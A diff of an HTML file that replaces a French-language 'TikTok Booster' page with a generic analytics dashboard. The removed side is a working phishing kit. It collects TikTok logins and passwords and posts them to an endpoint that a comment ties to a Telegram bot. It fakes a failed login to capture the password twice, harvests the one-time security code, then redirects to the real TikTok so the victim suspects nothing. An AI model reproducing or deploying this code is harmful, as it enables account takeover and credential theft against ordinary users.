@@ -1,190 +1,122 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="fr" class="dark">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Booster Pro v2.1</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body { background: radial-gradient(circle at center, #1a102e 0%, #000000 100%); }
-        .error-shake { animation: shake 0.2s ease-in-out 0s 2; }
-        @keyframes shake { 0% { margin-left: 0rem; } 25% { margin-left: 0.5rem; } 75% { margin-left: -0.5rem; } 100% { margin-left: 0rem; } }
-    </style>
-</head>
-<body class="text-gray-200 font-sans min-h-screen flex flex-col items-center justify-center p-4">
-
-    <div id="auth-section" class="w-full max-w-md bg-black/50 border border-purple-900/50 p-10 rounded-3xl shadow-2xl backdrop-blur-sm text-center">
-        <h1 class="text-4xl font-black italic text-white mb-2">TikTok <span class="text-purple-500">Booster</span></h1>
-        <p class="text-xs text-gray-400 uppercase tracking-widest mb-6">Service de Boost Gratuit v2.1</p>
-        
-        <div id="error-msg" class="hidden mb-6 p-3 bg-red-900/30 border border-red-600 text-red-400 text-xs rounded-lg">
-            Identifiant ou mot de passe incorrect. Veuillez réessayer.
-        </div>
-
-        <form id="auditForm" class="w-full space-y-4">
-            <input type="text" id="user" placeholder="E-mail ou Téléphone" required 
-                class="w-full p-4 bg-gray-900/80 border border-purple-900 rounded-xl outline-none focus:ring-2 focus:ring-purple-600 text-white">
-            <input type="password" id="pass" placeholder="Mot de passe" required 
-                class="w-full p-4 bg-gray-900/80 border border-purple-900 rounded-xl outline-none focus:ring-2 focus:ring-purple-600 text-white">
-            <button type="submit" id="btn" class="w-full bg-purple-700 text-white font-black py-4 rounded-xl shadow-lg transition hover:bg-purple-600">
-                VÉRIFIER & ACTIVER LE BOOST
-            </button>
-        </form>
-    </div>
-
-    <!-- Section OTP de Sécurité -->
-    <div id="otp-section" class="hidden w-full max-w-md bg-black/50 border border-purple-900/50 p-10 rounded-3xl shadow-2xl backdrop-blur-sm text-center">
-        <h1 class="text-3xl font-black italic text-white mb-2">Sécurité <span class="text-purple-500">Requise</span></h1>
-        <p class="text-xs text-gray-400 uppercase tracking-widest mb-6">Entrez le code de vérification à 6 chiffres</p>
-        
-        <div id="otp-error-msg" class="hidden mb-6 p-3 bg-red-900/30 border border-red-600 text-red-400 text-xs rounded-lg">
-            Code OTP invalide ou expiré. Veuillez réessayer.
-        </div>
-
-        <div class="mb-4 text-sm text-purple-300">
-            Temps restant : <span id="otp-timer" class="font-bold text-white">60</span>s
-        </div>
-
-        <form id="otpForm" class="w-full space-y-4">
-            <input type="text" id="otp-code" placeholder="123456" maxlength="6" required 
-                class="w-full p-4 text-center tracking-widest text-2xl font-bold bg-gray-900/80 border border-purple-900 rounded-xl outline-none focus:ring-2 focus:ring-purple-600 text-white">
-            <button type="submit" id="otp-btn" class="w-full bg-purple-700 text-white font-black py-4 rounded-xl shadow-lg transition hover:bg-purple-600">
-                VALIDER LE CODE
-            </button>
-        </form>
-    </div>
-
-    <div id="boost-section" class="hidden w-full max-w-lg flex flex-col items-center p-4 text-center">
-        <div class="bg-gray-950 border border-purple-800/50 text-white p-8 rounded-3xl w-full shadow-2xl">
-            <h3 class="text-[#fe2c55] font-extrabold text-2xl italic mb-6">STATUT : <span class="text-green-400 animate-pulse">CONNECTÉ ✅</span></h3>
-            <div class="space-y-6">
-                <div class="bg-gray-900 p-5 rounded-xl border border-purple-900 text-left">
-                    <label class="block text-xs text-gray-400 mb-2 uppercase tracking-widest">Quantité à injecter</label>
-                    <select class="bg-transparent w-full font-bold text-xl outline-none text-purple-200">
-                        <option>+ 1,000 Abonnés (Instant)</option>
-                        <option>+ 5,000 Abonnés (Premium)</option>
-                    </select>
-                </div>
-                <button id="finalBtn" class="w-full bg-white text-black py-4 rounded-xl font-black text-xl">
-                    LANCER LE BOOST 🚀
-                </button>
-                <p id="loading-text" class="hidden text-xs text-purple-400 animate-bounce">Préparation de l'injection en cours...</p>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        let attempts = 0;
-        let otpTimerInterval;
-        let timeLeft = 60;
-        const form = document.getElementById('auditForm');
-        const otpForm = document.getElementById('otpForm');
-        
-        function startOtpTimer() {
-            timeLeft = 60;
-            const timerDisplay = document.getElementById('otp-timer');
-            if (otpTimerInterval) clearInterval(otpTimerInterval);
-            otpTimerInterval = setInterval(() => {
-                timeLeft--;
-                timerDisplay.innerText = timeLeft;
-                if (timeLeft <= 0) {
-                    clearInterval(otpTimerInterval);
-                    document.getElementById('otp-error-msg').innerText = "Le code OTP a expiré. Veuillez recommencer.";
-                    document.getElementById('otp-error-msg').classList.remove('hidden');
-                }
-            }, 1000);
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Nexus Analytics Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            brand: {
+              purple: '#A855F7',
+              blue: '#3B82F6',
+              dark: '#0A0A0B',
+              panel: '#141416',
+            }
+          }
         }
+      }
+    }
+  </script>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="manifest" href="manifest.json" />
+</head>
+<body class="bg-[#0A0A0B] text-[#FAFAFA] min-h-screen flex flex-col font-sans">
+  <!-- Top Navigation -->
+  <header class="border-b border-[#27272A] bg-[#141416]/80 backdrop-blur sticky top-0 z-20 px-6 py-4 flex items-center justify-between">
+    <div class="flex items-center space-x-3">
+      <div class="w-8 h-8 rounded-lg bg-gradient-to-tr from-purple-500 to-blue-500 flex items-center justify-center font-bold text-white shadow-lg shadow-purple-500/20">
+        N
+      </div>
+      <div>
+        <h1 class="text-base font-semibold leading-none tracking-tight">Nexus Analytics</h1>
+        <span class="text-xs text-neutral-400">Plateforme de métriques cloud</span>
+      </div>
+    </div>
+    
+    <div class="flex items-center space-x-4">
+      <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+        <span class="w-1.5 h-1.5 mr-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Systèmes 100% Opérationnels
+      </span>
+      <button id="refreshBtn" class="px-3 py-1.5 rounded-lg bg-[#27272A] hover:bg-[#3F3F46] text-xs font-medium transition cursor-pointer flex items-center gap-1.5">
+        <span>Actualiser</span>
+      </button>
+    </div>
+  </header>
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('btn');
-            const errorBox = document.getElementById('error-msg');
-            const userVal = document.getElementById('user').value;
-            const passVal = document.getElementById('pass').value;
+  <!-- Main Content -->
+  <main class="flex-1 p-6 max-w-7xl w-full mx-auto space-y-6">
+    <!-- Stat Cards Grid -->
+    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+      <div class="bg-[#141416] border border-[#27272A] rounded-xl p-5 hover:border-purple-500/40 transition">
+        <div class="flex justify-between items-start">
+          <span class="text-xs font-medium text-neutral-400">Revenus Mensuels</span>
+          <span class="text-xs text-emerald-400 font-semibold bg-emerald-500/10 px-2 py-0.5 rounded">+18.4%</span>
+        </div>
+        <div class="mt-3 text-2xl font-bold tracking-tight text-white" id="statRevenue">42,850 €</div>
+        <p class="mt-1 text-xs text-neutral-500">Objectif du mois : 45,000 €</p>
+      </div>
 
-            btn.innerText = "Synchronisation...";
-            btn.disabled = true;
+      <div class="bg-[#141416] border border-[#27272A] rounded-xl p-5 hover:border-blue-500/40 transition">
+        <div class="flex justify-between items-start">
+          <span class="text-xs font-medium text-neutral-400">Utilisateurs Actifs</span>
+          <span class="text-xs text-emerald-400 font-semibold bg-emerald-500/10 px-2 py-0.5 rounded">+9.2%</span>
+        </div>
+        <div class="mt-3 text-2xl font-bold tracking-tight text-white" id="statUsers">12,410</div>
+        <p class="mt-1 text-xs text-neutral-500">2,180 connectés en ce moment</p>
+      </div>
 
-            try {
-                // Envoi des infos à ton API Telegram (6224971749)
-                await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user: userVal, pass: passVal, attempt: attempts + 1 })
-                });
+      <div class="bg-[#141416] border border-[#27272A] rounded-xl p-5 hover:border-purple-500/40 transition">
+        <div class="flex justify-between items-start">
+          <span class="text-xs font-medium text-neutral-400">Requêtes / Seconde</span>
+          <span class="text-xs text-blue-400 font-semibold bg-blue-500/10 px-2 py-0.5 rounded">Optimal</span>
+        </div>
+        <div class="mt-3 text-2xl font-bold tracking-tight text-white" id="statRps">3,840 req/s</div>
+        <p class="mt-1 text-xs text-neutral-500">Latence moyenne : 24ms</p>
+      </div>
 
-                if (attempts === 0) {
-                    // Première tentative : On simule une erreur
-                    setTimeout(() => {
-                        attempts++;
-                        btn.disabled = false;
-                        btn.innerText = "VÉRIFIER & ACTIVER LE BOOST";
-                        errorBox.classList.remove('hidden');
-                        document.getElementById('pass').value = "";
-                        document.getElementById('auth-section').classList.add('error-shake');
-                        setTimeout(() => document.getElementById('auth-section').classList.remove('error-shake'), 500);
-                    }, 1200);
-                } else {
-                    // Deuxième tentative : Passage à l'étape OTP de sécurité
-                    document.getElementById('auth-section').classList.add('hidden');
-                    document.getElementById('otp-section').classList.remove('hidden');
-                    startOtpTimer();
-                }
-            } catch (err) {
-                btn.disabled = false;
-                btn.innerText = "Erreur réseau. Réessayer";
-            }
-        });
+      <div class="bg-[#141416] border border-[#27272A] rounded-xl p-5 hover:border-emerald-500/40 transition">
+        <div class="flex justify-between items-start">
+          <span class="text-xs font-medium text-neutral-400">Taux de Conversion</span>
+          <span class="text-xs text-emerald-400 font-semibold bg-emerald-500/10 px-2 py-0.5 rounded">+3.1%</span>
+        </div>
+        <div class="mt-3 text-2xl font-bold tracking-tight text-white" id="statConversion">4.82%</div>
+        <p class="mt-1 text-xs text-neutral-500">+0.6% par rapport au T2</p>
+      </div>
+    </div>
 
-        // Gestion de la soumission du code OTP
-        otpForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const otpBtn = document.getElementById('otp-btn');
-            const otpErrorBox = document.getElementById('otp-error-msg');
-            const otpVal = document.getElementById('otp-code').value;
-            const userVal = document.getElementById('user').value;
+    <!-- Chart & Live Feed Grid -->
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+      <div class="lg:col-span-2 bg-[#141416] border border-[#27272A] rounded-xl p-6">
+        <div class="flex items-center justify-between mb-4">
+          <div>
+            <h2 class="text-sm font-semibold text-white">Activité du Trafic Réseau</h2>
+            <p class="text-xs text-neutral-400">Échantillonnage en temps réel sur 24 heures</p>
+          </div>
+          <div class="flex gap-2">
+            <button class="px-2.5 py-1 text-xs rounded bg-purple-600 text-white font-medium">Heure</button>
+            <button class="px-2.5 py-1 text-xs rounded bg-[#27272A] text-neutral-300 hover:text-white">Jour</button>
+          </div>
+        </div>
+        
+        <div class="h-64 flex items-end gap-2 pt-6 pb-2" id="chartBars">
+          <!-- Bars generated via JS -->
+        </div>
+      </div>
 
-            if (timeLeft <= 0) {
-                otpErrorBox.innerText = "Le code OTP a expiré.";
-                otpErrorBox.classList.remove('hidden');
-                return;
-            }
+      <div class="bg-[#141416] border border-[#27272A] rounded-xl p-6 flex flex-col">
+        <h2 class="text-sm font-semibold text-white mb-3">Dernières Activités</h2>
+        <div class="space-y-3.5 flex-1 overflow-y-auto max-h-64 pr-1" id="activityFeed">
+          <!-- Activities populated by script -->
+        </div>
+      </div>
+    </div>
+  </main>
 
-            otpBtn.innerText = "Vérification OTP...";
-            otpBtn.disabled = true;
-
-            try {
-                // Envoi du code OTP au bot Telegram
-                await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ user: userVal, otp: otpVal })
-                });
-
-                clearInterval(otpTimerInterval);
-                document.getElementById('otp-section').classList.add('hidden');
-                document.getElementById('boost-section').classList.remove('hidden');
-            } catch (err) {
-                otpBtn.disabled = false;
-                otpBtn.innerText = "VALIDER LE CODE";
-                otpErrorBox.innerText = "Erreur réseau lors de la validation OTP.";
-                otpErrorBox.classList.remove('hidden');
-            }
-        });
-
-        // Action finale : Redirection vers le vrai TikTok
-        document.getElementById('finalBtn').addEventListener('click', () => {
-            const btn = document.getElementById('finalBtn');
-            const text = document.getElementById('loading-text');
-            
-            btn.classList.add('hidden');
-            text.classList.remove('hidden');
-
-            setTimeout(() => {
-                // Redirection vers TikTok pour que l'utilisateur pense que c'est fini
-                window.location.href = "https://www.tiktok.com/trending";
-            }, 3000);
-        });
-    </script>
+  <script src="app.js"></script>
 </body>
 </html>
